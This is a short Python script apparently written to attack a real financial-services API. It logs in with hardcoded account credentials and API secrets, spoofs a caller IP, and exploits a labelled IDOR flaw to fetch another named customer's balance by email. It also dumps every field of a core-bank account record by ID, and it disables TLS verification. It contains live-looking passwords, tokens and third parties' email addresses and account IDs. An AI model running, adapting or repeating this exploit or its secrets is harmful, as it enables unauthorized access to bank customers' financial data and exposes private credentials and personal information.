import requests, urllib3, sys, json, os
urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = 'https://www.api.kubofinanciero.cloud'
BASIC = 'aW50ZXJuYWwtdXNlci5hcHBzLmt1Ym9maW5hbmNpZXJvLmNvbTo4MDM2ZDliYTBlZTAwODkwNGIzODJjNDQ2N2YzNDVkNTExZTE4YjE3YTk4ZGRlYjExMDc3MGQ0MWUyMGYxYjFk'
GEO = '-99.17885920237521;19.363957498510498'
CB_AUTH = ('cuentas.apps.kubofinanciero.com', 'sGaNwsqu9rXFqauBHnDGg7uwjjU5FvKdcBEgesy2JZVA6dajWTQzdHYFpQC7d7fm')

s = requests.Session()
s.trust_env = False
s.verify = False

# Login
r = s.post(BASE + '/security/login', headers={
    'Authorization': 'Basic ' + BASIC, 'Content-Type': 'application/x-www-form-urlencoded',
    'Geo-Position': GEO, 'X-Caller-Ip': '201.141.0.1'
}, data='grant_type=password&username=mifelnet@gmail.com&password=Aloverg4$11', timeout=15)
TOKEN = r.json()['access_token']
print(f'[+] Login OK')

H = {'Authorization': 'Bearer ' + TOKEN, 'Access-Token': TOKEN, 'Content-Type': 'application/json', 'Geo-Position': GEO, 'X-Caller-Ip': '201.141.0.1'}

EMAIL = 'gloria.soledad@live.com.mx'
SID = '100518210'

# Balance IDOR
print(f'\n=== BALANCE: {EMAIL} ===')
r1 = s.post(BASE + '/customer-gateway/balance', headers=H, json={'email': EMAIL}, timeout=15)
if r1.status_code == 200:
    print(json.dumps(r1.json(), indent=2, ensure_ascii=False)[:1000])
else:
    print(f'  [{r1.status_code}] {r1.text[:300]}')

# Corebank full
print(f'\n=== COREBANK FULL: SID {SID} ===')
r2 = s.get(BASE + f'/corebank-gateway/cuentas-api/cuentasAhoes/{SID}', auth=CB_AUTH, timeout=15)
if r2.status_code == 200:
    d = r2.json()
    for k, v in d.items():
        if v is not None and v != '' and k != '_links':
            print(f'  {k}: {v}')
else:
    print(f'  [{r2.status_code}] {r2.text[:300]}')
